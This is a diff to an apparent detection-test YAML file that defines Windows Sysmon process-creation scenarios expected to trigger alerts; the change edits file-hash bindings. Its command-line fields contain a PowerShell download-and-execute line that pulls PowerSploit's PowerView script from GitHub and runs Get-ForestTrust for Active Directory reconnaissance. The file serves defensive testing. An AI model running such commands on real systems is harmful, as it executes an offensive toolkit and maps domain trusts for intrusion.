@@ -26,6 +26,7 @@ workloads:
   - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
     bindings:
       computer:   ref.computer
+      file_hash:  "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
       shell_args: "-C \"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust\""
     expectation:
       expected: alert
@@ -41,7 +42,7 @@ workloads:
       original_file_name:  Cmd.Exe
       host_description:    Windows Command Processor
       file_version:        10.0.14393.0 (rs1_release.160715-1616)
-      file_hash:           "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A"
+      file_hash:           "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2"
       command_line:        "cmd.exe  /c powershell.exe -C \"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust\""
       parent_command_line: 'C:\Windows\system32\cmd.exe /c ""C:\Users\Administrator\Desktop\kaboom.bat" "'
     expectation:
